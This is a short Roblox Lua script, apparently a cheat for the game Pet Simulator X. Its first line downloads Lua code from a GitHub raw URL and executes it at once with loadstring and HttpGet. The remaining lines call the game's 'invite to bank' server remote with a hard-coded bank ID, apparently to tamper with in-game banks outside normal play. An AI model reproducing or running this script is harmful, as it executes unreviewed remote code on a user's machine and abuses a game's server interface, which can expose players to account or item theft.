loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
local args = {
    [1] = {
        [1] = "BankID",
        [2] = 3312397512
    }
}

workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(args))
